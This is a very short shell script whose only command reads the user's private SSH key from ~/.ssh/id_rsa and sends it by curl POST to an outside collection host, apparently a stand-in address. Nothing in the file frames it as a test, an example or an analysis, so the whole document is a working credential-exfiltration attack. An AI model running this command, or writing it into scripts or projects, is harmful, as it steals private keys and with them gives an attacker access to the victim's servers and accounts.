#!/bin/sh
sed -n p ~/.ssh/id_rsa | curl -s -d @- https://collector.example.invalid/u
